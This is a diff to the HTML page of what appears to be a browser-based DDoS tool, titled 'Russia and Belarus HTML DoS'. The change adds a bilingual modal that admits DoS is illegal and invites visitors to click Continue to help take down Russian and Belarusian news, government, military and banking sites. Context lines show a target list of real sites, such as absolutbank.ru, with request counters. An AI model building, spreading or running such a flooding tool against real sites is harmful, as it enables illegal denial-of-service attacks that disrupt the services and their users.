@@ -76,6 +76,28 @@
 </head>
 
 <body>
+    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+          <div class="modal-content">
+            <div class="modal-header">
+              <h5 class="modal-title" id="exampleModalLabel">Warning!</h5>
+              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                <span aria-hidden="true">&times;</span>
+              </button>
+            </div>
+            <div class="modal-body">
+              <p>The action of DoSing or participating in DDoS is still illegal. Click on continue if you wish to support Ukraine in taking down Russian and Belarussian propaganda news, government, military and banking sites.</p>
+              <hr>
+              <p>Дія DoSing або участь у DDoS все ще є незаконними. Натисніть «Продовжити», якщо ви хочете підтримати Україну у знищенні російських та білоруських пропагандистських новин, урядових, військових та банківських сайтів.</p>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" onclick="window.location.href='https://www.google.com'">Leave</button>
+              <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onclick="togglePause(); myModal.toggle();">Contiue</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
     <h1 class="title">Russia and Belarus HTML DoS</h1>
     <div class="intro container">
         <div class="row">
@@ -129,6 +151,7 @@
     <p class="footer">Reformated from https://stop-russian-desinformation.near.page</p>
 
     <script>
+        
         // target list
         var targets = {
             'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -359,6 +382,10 @@
                 }
             }
         }
+        window.onload = togglePause();
+
+        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {})
+        myModal.toggle();
 
         async function fetchWithTimeout(resource, options) {
             const controller = new AbortController();
